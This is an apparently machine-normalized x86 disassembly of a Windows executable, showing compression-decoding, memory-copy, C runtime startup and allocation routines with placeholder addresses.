mov [ esp + 0x28 ] ecx
test bl 0x10
jne r-xdata
mov [ esp + 0x18 ] ebp
mov esi [ esp + 0x3c ]
mov ebx [ esp + 0x10 ]
mov ecx [ esi + 0x4 ]
sub ecx ebx
mov ebx eax
shr ebx 0x3
cmp ebx ecx
jae r-xdata
cmp [ esp + 0x10 ] 0xa
jb r-xdata
and ebx 0xf
sub eax ebx
mov ecx [ ebx * 4 + rw-data ]
and ecx edx
add ecx [ esi + 0x4 ]
mov [ esp + 0x2c ] ecx
mov ecx ebx
shr edx cl
cmp eax 0xf
jae r-xdata
test bl 0x40
jne r-xdata
mov ebx [ esp + 0x38 ]
sub ebp ecx
mov [ ebx + 0x20 ] edx
lea edx [ ecx * 8 ]
sub eax edx
mov [ ebx + 0x1c ] eax
mov eax [ esp + 0x10 ]
mov edx [ esi ]
add ecx eax
mov eax [ esi + 0x8 ]
mov [ esi + 0x4 ] ecx
mov ecx ebp
mov [ esi ] ebp
sub ecx edx
add eax ecx
mov [ esi + 0x8 ] eax
mov [ ebx + 0x34 ] edi
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x14
retn
mov ecx ebx
jmp r-xdata
mov ecx [ esp + 0x20 ]
mov esi [ esp + 0x34 ]
and ecx edx
xor ebx ebx
mov bl [ esi + ecx * 8 ]
lea esi [ esi + ecx * 8 ]
xor ecx ecx
mov cl [ esi + 0x1 ]
shr edx cl
sub eax ecx
mov [ esp + 0x28 ] ecx
test bl 0x10
jne r-xdata
mov ecx [ esp + 0x10 ]
dec ecx
mov [ esp + 0x10 ] ecx
xor ecx ecx
mov cl [ ebp ]
mov esi ecx
mov ecx eax
shl esi cl
add eax 0x8
or edx esi
inc ebp
cmp eax 0xf
jb r-xdata
test bl 0x20
je r-xdata
mov ecx [ ebx * 4 + rw-data ]
mov ebx [ esi + 0x4 ]
and ecx edx
add ecx ebx
xor ebx ebx
mov bl [ esi + ecx * 8 ]
lea esi [ esi + ecx * 8 ]
test ebx ebx
je r-xdata
cmp eax 0x14
jae r-xdata
and ebx 0xf
cmp eax ebx
jae r-xdata
test bl 0x40
jne r-xdata
mov [ esp + 0x18 ] ebp
mov ecx [ esp + 0x3c ]
mov ebx [ esp + 0x10 ]
mov esi [ ecx + 0x4 ]
mov [ ecx + 0x18 ] rw-data
sub esi ebx
mov [ esp + 0x2c ] esi
mov esi eax
mov ebx [ esp + 0x2c ]
shr esi 0x3
cmp esi ebx
jb r-xdata
mov esi [ esp + 0x3c ]
mov ebx [ esp + 0x10 ]
mov ecx [ esi + 0x4 ]
sub ecx ebx
mov ebx eax
shr ebx 0x3
cmp ebx ecx
jae r-xdata
xor ecx ecx
mov cl [ esi + 0x1 ]
shr edx cl
sub eax ecx
mov [ esp + 0x28 ] ecx
test bl 0x10
je r-xdata
mov ebp [ ebx * 4 + rw-data ]
mov ecx [ esi + 0x4 ]
mov esi [ esp + 0x14 ]
and ebp edx
add ebp ecx
mov ecx ebx
shr edx cl
mov ecx [ esp + 0x2c ]
sub eax ebx
sub esi ecx
mov [ esp + 0x14 ] esi
mov esi edi
sub esi ebp
mov ebp [ esp + 0x38 ]
mov ebx [ ebp + 0x28 ]
cmp esi ebx
jae r-xdata
mov ecx [ esp + 0x10 ]
dec ecx
mov [ esp + 0x10 ] ecx
xor ecx ecx
mov cl [ ebp ]
mov ebp ecx
mov ecx eax
shl ebp cl
add eax 0x8
or edx ebp
mov ebp [ esp + 0x18 ]
inc ebp
cmp eax ebx
mov [ esp + 0x18 ] ebp
jb r-xdata
mov ecx [ esp + 0x3c ]
mov ebx [ esp + 0x10 ]
mov esi [ ecx + 0x4 ]
mov [ ecx + 0x18 ] rw-data
sub esi ebx
mov [ esp + 0x2c ] esi
mov esi eax
mov ebx [ esp + 0x2c ]
shr esi 0x3
cmp esi ebx
jb r-xdata
mov ecx [ ebx * 4 + rw-data ]
mov ebx [ esi + 0x4 ]
and ecx edx
add ecx ebx
xor ebx ebx
mov bl [ esi + ecx * 8 ]
lea esi [ esi + ecx * 8 ]
xor ecx ecx
mov cl [ esi + 0x1 ]
shr edx cl
sub eax ecx
mov [ esp + 0x28 ] ecx
test bl 0x10
je r-xdata
mov ebx [ esp + 0x38 ]
sub ebp esi
mov [ ebx + 0x20 ] edx
lea edx [ esi * 8 ]
sub eax edx
mov edx ebp
mov [ ebx + 0x1c ] eax
mov eax [ esp + 0x10 ]
add esi eax
mov eax [ ecx + 0x8 ]
mov [ ecx + 0x4 ] esi
mov esi [ ecx ]
sub edx esi
mov [ ecx ] ebp
add eax edx
mov [ ecx + 0x8 ] eax
mov [ ebx + 0x34 ] edi
pop edi
pop esi
pop ebp
mov eax 0xfffffffd
pop ebx
add esp 0x14
retn
mov esi [ esp + 0x2c ]
mov ebx [ esp + 0x38 ]
sub ebp ecx
mov [ ebx + 0x20 ] edx
lea edx [ ecx * 8 ]
sub eax edx
mov [ ebx + 0x1c ] eax
mov eax [ esp + 0x10 ]
mov edx [ esi ]
add ecx eax
mov eax [ esi + 0x8 ]
mov [ esi + 0x4 ] ecx
mov ecx ebp
mov [ esi ] ebp
sub ecx edx
add eax ecx
mov [ esi + 0x8 ] eax
mov [ ebx + 0x34 ] edi
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x14
retn
mov ecx ebx
mov bl [ esi ]
mov [ edi ] bl
mov bl [ esi + 0x1 ]
inc edi
inc esi
mov [ edi ] bl
inc edi
inc esi
sub ecx 0x2
mov ebp [ ebp + 0x2c ]
mov [ esp + 0x28 ] ebp
sub ebp ebx
jmp r-xdata
mov bl [ esi ]
mov [ edi ] bl
inc edi
inc esi
dec ecx
jne r-xdata
mov ebp [ esp + 0x18 ]
jmp r-xdata
add esi ebp
cmp esi ebx
jb r-xdata
mov ebp [ esp + 0x28 ]
sub ebp esi
cmp ecx ebp
jbe r-xdata
cmp [ esp + 0x14 ] 0x102
jb r-xdata
mov bl [ esi ]
mov [ edi ] bl
mov bl [ esi + 0x1 ]
inc edi
inc esi
mov [ edi ] bl
inc edi
inc esi
sub ecx 0x2
sub ecx ebp
mov bl [ esi ]
mov [ edi ] bl
inc edi
inc esi
dec ecx
jne r-xdata
mov ebp [ esp + 0x18 ]
jmp r-xdata
mov bl [ esi ]
mov [ edi ] bl
inc edi
inc esi
dec ebp
jne r-xdata
mov esi [ esp + 0x38 ]
mov esi [ esi + 0x28 ]
mov bl [ esi ]
mov [ edi ] bl
inc edi
inc esi
dec ecx
jne r-xdata
mov ebp [ esp + 0x18 ]
jmp r-xdata
sub_40ab70
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x100
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_40abf8 ]
jmp [ ecx * 4 + jump_table_40ac78 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40ace4 ]
pop esi
pop edi
pop ebp
jmp sub_40bb55
jmp [ ecx * 4 + jump_table_40ae80 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_40ad84 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40ae80 ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_40ace4 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_40ae80 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40ace4 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40ace4 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40ace4 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40ae80 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40ae80 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40ae80 ]
sub_40aed5
push ecx
push ebx
push ebp
push esi
push edi
push [ rw-data ]
call sub_40bd2f
push [ rw-data ]
mov esi eax
mov [ esp + 0x18 ] esi
call sub_40bd2f
mov edi eax
cmp edi esi
pop ecx
pop ecx
jb r-xdata
xor eax eax
mov ebx edi
sub ebx esi
lea ebp [ ebx + 0x4 ]
cmp ebp 0x4
jb r-xdata
push esi
call sub_40c2db
mov esi eax
cmp esi ebp
pop ecx
jae r-xdata
push [ esp + 0x18 ]
call sub_40bcb8
mov [ edi ] eax
add edi 0x4
push edi
call sub_40bcb8
pop ecx
mov [ rw-data ] eax
mov eax [ esp + 0x1c ]
pop ecx
jmp r-xdata
mov eax 0x800
cmp esi eax
jae r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
add eax esi
cmp eax esi
jb r-xdata
mov eax esi
lea eax [ esi + 0x10 ]
cmp eax esi
jb r-xdata
push eax
push [ esp + 0x14 ]
call sub_40c290
test eax eax
pop ecx
pop ecx
jne r-xdata
push eax
push [ esp + 0x14 ]
call sub_40c290
test eax eax
pop ecx
pop ecx
je r-xdata
sar ebx 0x2
push eax
lea edi [ eax + ebx * 4 ]
call sub_40bcb8
pop ecx
mov [ rw-data ] eax
sub_40af8e
push esi
push 0x4
push 0x20
call sub_40c248
mov esi eax
push esi
call sub_40bcb8
add esp 0xc
test esi esi
mov [ rw-data ] eax
mov [ rw-data ] eax
jne r-xdata
and [ esi ] 0x0
xor eax eax
pop esi
retn
push 0x18
pop eax
pop esi
retn
sub_40afbd
push 0xc
push r--data
call sub_40c69c
call sub_40c3dd
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_40aed5
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40aff3
mov eax [ ebp - 0x1c ]
call sub_40c6e1
retn
sub_40b00b
mov eax [ esp + 0x4 ]
test eax eax
push esi
mov esi ecx
mov [ esi + 0xc ] 0x0
jne r-xdata
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
call sub_40bf4b
mov [ esi + 0x8 ] eax
mov ecx [ eax + 0x6c ]
mov [ esi ] ecx
mov ecx [ eax + 0x68 ]
mov [ esi + 0x4 ] ecx
mov ecx [ esi ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
call sub_40d1e3
mov [ esi ] eax
mov eax esi
pop esi
retn 0x4
or [ eax + 0x70 ] 0x2
mov [ esi + 0xc ] 0x1
jmp r-xdata
call sub_40caa4
mov [ esi + 0x4 ] eax
sub_40b08d
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x18 ]
call sub_40b00b
mov ebx [ ebp + 0x8 ]
mov esi 0x100
cmp ebx esi
jae r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov ecx [ ebp - 0x18 ]
cmp [ ecx + 0xac ] 0x1
jle r-xdata
call sub_40d694
mov [ eax ] 0x2a
xor ecx ecx
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x3 ] 0x0
inc ecx
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_40d6a7
test eax eax
pop ecx
pop ecx
je r-xdata
mov eax [ ecx + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
and eax 0x1
lea eax [ ebp - 0x18 ]
push eax
push 0x1
push ebx
call sub_40d6dd
mov ecx [ ebp - 0x18 ]
add esp 0xc
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp eax 0x1
jne r-xdata
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x4 ] al
mov [ ebp - 0x3 ] bl
mov [ ebp - 0x2 ] 0x0
pop ecx
jmp r-xdata
mov eax [ ecx + 0xcc ]
movzx eax [ eax + ebx ]
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
movzx ecx [ ebp - 0x7 ]
xor eax eax
mov ah [ ebp - 0x8 ]
or eax ecx
movzx eax [ ebp - 0x8 ]
jmp r-xdata
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x4 ]
lea edx [ ebp - 0x8 ]
push 0x3
push edx
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
push esi
push [ eax + 0x14 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_40d616
add esp 0x24
test eax eax
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_40b1a4
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ esp + 0x8 ]
call sub_40b08d
pop ecx
pop ecx
mov eax [ esp + 0x4 ]
lea ecx [ eax - 0x41 ]
cmp ecx 0x19
ja r-xdata
retn
add eax 0x20
retn
sub_40b1d0
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x100
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_40b258 ]
jmp [ ecx * 4 + jump_table_40b2d8 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40b344 ]
pop esi
pop edi
pop ebp
jmp sub_40bb55
jmp [ ecx * 4 + jump_table_40b4e0 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_40b3e4 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40b4e0 ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_40b344 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_40b4e0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40b344 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40b344 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40b344 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40b4e0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40b4e0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40b4e0 ]
sub_40b5aa
push ebx
mov ebx [ esp + 0x8 ]
push esi
push edi
mov edi ecx
mov [ edi ] r--data
mov eax [ ebx ]
test eax eax
je r-xdata
and [ edi + 0x4 ] 0x0
push eax
call sub_40dab0
mov esi eax
inc esi
push esi
call sub_40d9e0
test eax eax
pop ecx
pop ecx
mov [ edi + 0x4 ] eax
je r-xdata
mov [ edi + 0x8 ] 0x1
mov eax edi
pop edi
pop esi
pop ebx
retn 0x4
push [ ebx ]
push esi
push eax
call sub_40d92c
add esp 0xc
jmp r-xdata
sub_40b5f8
push ebx
mov ebx [ esp + 0x8 ]
push esi
mov esi ecx
mov [ esi ] r--data
mov eax [ ebx + 0x8 ]
mov [ esi + 0x8 ] eax
test eax eax
mov eax [ ebx + 0x4 ]
push edi
je r-xdata
mov [ esi + 0x4 ] eax
test eax eax
je r-xdata
and [ esi + 0x4 ] 0x0
jmp r-xdata
push eax
call sub_40dab0
mov edi eax
inc edi
push edi
call sub_40d9e0
test eax eax
pop ecx
pop ecx
mov [ esi + 0x4 ] eax
je r-xdata
pop edi
mov eax esi
pop esi
pop ebx
retn 0x4
push [ ebx + 0x4 ]
push edi
push eax
call sub_40d92c
add esp 0xc
jmp r-xdata
sub_40b6b8
cmp [ __dos_header ] 0x5a4d
jne r-xdata
xor eax eax
retn
mov eax [ r--data ]
cmp [ eax + __dos_header ] 0x4550
jne r-xdata
cmp [ eax + r--data ] 0x10b
jne r-xdata
cmp [ eax + r--data ] 0xe
jbe r-xdata
xor ecx ecx
cmp [ eax + r--data ] ecx
setne cl
mov eax ecx
retn
sub_40b6f9
push 0x60
push r--data
call sub_40c69c
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x70 ]
push eax
call [ GetStartupInfoA@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
mov edi 0x94
push edi
push 0x0
mov ebx [ GetProcessHeap@IAT ]
call ebx
push eax
call [ HeapAlloc@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov [ esi ] edi
push esi
call [ GetVersionExA@IAT ]
push esi
push 0x0
test eax eax
jne r-xdata
push 0x12
call sub_40b694
mov eax [ esi + 0x10 ]
mov [ ebp - 0x20 ] eax
mov eax [ esi + 0x4 ]
mov [ ebp - 0x24 ] eax
mov eax [ esi + 0x8 ]
mov [ ebp - 0x28 ] eax
mov edi [ esi + 0xc ]
and edi 0x7fff
call ebx
push eax
call [ HeapFree@IAT ]
mov esi [ ebp - 0x20 ]
cmp esi 0x2
je r-xdata
call ebx
push eax
call [ HeapFree@IAT ]
jmp r-xdata
mov ecx [ ebp - 0x24 ]
mov eax ecx
shl eax 0x8
mov edx [ ebp - 0x28 ]
add eax edx
mov [ rw-data ] esi
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] edi
call sub_40b6b8
mov [ ebp - 0x20 ] eax
xor ebx ebx
inc ebx
push ebx
call sub_40e672
pop ecx
test eax eax
jne r-xdata
or edi 0x8000
mov eax 0xff
call sub_40c084
test eax eax
jne r-xdata
push 0x1c
call sub_40b694
call sub_40e5cf
mov [ ebp - 0x4 ] ebx
call sub_40e37b
test eax eax
jge r-xdata
push 0x10
call sub_40b694
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call sub_40e246
mov [ rw-data ] eax
call sub_40e18d
test eax eax
jge r-xdata
push 0x1b
call sub_40c37e
pop ecx
call sub_40df1a
test eax eax
jge r-xdata
push 0x8
call sub_40c37e
pop ecx
push ebx
call sub_40c49a
pop ecx
test eax eax
je r-xdata
push 0x9
call sub_40c37e
pop ecx
call sub_40debd
test [ ebp - 0x44 ] bl
je r-xdata
push eax
call sub_40c37e
pop ecx
push 0xa
pop ecx
movzx ecx [ ebp - 0x40 ]
jmp r-xdata
call sub_40c630
jmp r-xdata
push eax
call sub_40c60e
push ecx
push eax
push 0x0
push __dos_header
call sub_40455d
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
jmp r-xdata
call sub_40c6e1
retn
sub_40b89a
mov esp [ ebp - 0x18 ]
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
call sub_40c63f
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
jmp r-xdata
push eax
call sub_40c61f
call sub_40c6e1
retn
sub_40b8e3
push 0xc
push r--data
call sub_40c69c
mov ecx [ ebp + 0x8 ]
xor edi edi
cmp ecx edi
jbe r-xdata
imul ecx [ ebp + 0xc ]
mov esi ecx
mov [ ebp + 0x8 ] esi
cmp esi edi
jne r-xdata
push 0xffffffe0
pop eax
xor edx edx
div ecx
cmp eax [ ebp + 0xc ]
sbb eax eax
inc eax
jne r-xdata
xor ebx ebx
mov [ ebp - 0x1c ] ebx
cmp esi 0xffffffe0
ja r-xdata
xor esi esi
inc esi
call sub_40d694
mov [ eax ] 0xc
push edi
push edi
push edi
push edi
push edi
call sub_40f5bf
add esp 0x14
cmp ebx edi
jne r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
call sub_40c6e1
retn
mov eax ebx
cmp [ rw-data ] edi
je r-xdata
cmp ebx edi
jne r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
mov eax [ ebp + 0x8 ]
cmp eax [ rw-data ]
ja r-xdata
cmp ebx edi
jne r-xdata
push esi
call sub_40e911
pop ecx
test eax eax
jne r-xdata
push esi
push 0x8
